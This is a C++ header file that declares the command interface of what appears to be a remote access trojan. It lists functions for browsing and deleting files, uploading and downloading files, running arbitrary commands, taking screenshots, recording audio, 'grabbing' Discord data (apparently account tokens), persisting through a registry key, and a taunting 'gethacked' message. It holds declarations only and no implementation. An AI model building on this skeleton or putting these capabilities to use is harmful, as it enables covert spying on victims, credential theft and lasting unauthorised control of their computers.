#ifndef COMMANDS_H
#define COMMANDS_H

#include <string>
#include <vector>
#include <cstdint>

class Controller;

enum class NavigateCommand {
    ls, cd, pwd, rm
};

enum class AudioCommand {
    start, stop, list
};

enum class DiscordCommand {
    check, grab
};

enum class ShowoffCommand {
    gethacked, hi
};

// navigation
int navigation(Controller& ctrl, uint8_t cmd, const std::string path);
// files
int downloadFile(Controller& ctrl, const std::string path);
int uploadFile(Controller& ctrl, const std::string path, std::vector<uint8_t> data);
// exec
int exec(Controller& ctrl, std::string cmd, bool wait);
// screen
int screenshot(Controller& ctrl);
// audio
int audioCommand(Controller& ctrl, AudioCommand cmd);
// discord
int discordCommand(Controller& ctrl, DiscordCommand cmd);
// persistence
int persist(Controller& ctrl, const std::string regkey);
// dialog
int dialog(Controller& ctrl, uint32_t type, std::string message, std::string title);
// showoff
int showoff(Controller& ctrl, uint8_t type);

#endif